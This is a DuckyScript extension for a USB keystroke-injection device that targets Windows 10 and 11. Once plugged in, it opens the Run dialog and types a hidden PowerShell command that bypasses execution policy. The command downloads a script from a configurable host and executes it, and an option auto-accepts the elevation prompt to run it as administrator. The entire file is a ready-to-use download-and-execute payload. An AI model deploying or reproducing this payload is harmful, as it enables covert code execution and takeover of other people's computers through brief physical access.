EXTENSION RUN_HOSTED_POWERSHELL
	REM_BLOCK INFOS
		Title: Run Hosted PowerShell
		Author: Who-Is-Julien
		Description: **TODO**
		Target: Windows 10, 11
    	Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/Run_Hosted_PowerShell/README.md
    END_REM

    REM Required options:
	DEFINE SCRIPT_URL example.com

    REM Advanced options:
	DEFINE SHORT_DELAY 500
	DEFINE MEDIUM_DELAY 2000
	DEFINE ELEVATED_EXECUTION FALSE

	GUI r
	DELAY MEDIUM_DELAY
	STRING PowerShell -W H -EX Bypass "IWR -UseB '
	STRING SCRIPT_URL
	STRING ' | IEX"
	IF ( ELEVATED_EXECUTION == TRUE ) THEN
		DELAY SHORT_DELAY
		CTRL SHIFT ENTER
		DELAY SHORT_DELAY
		LEFT
	END_IF
	DELAY SHORT_DELAY
	ENTER
END_EXTENSION
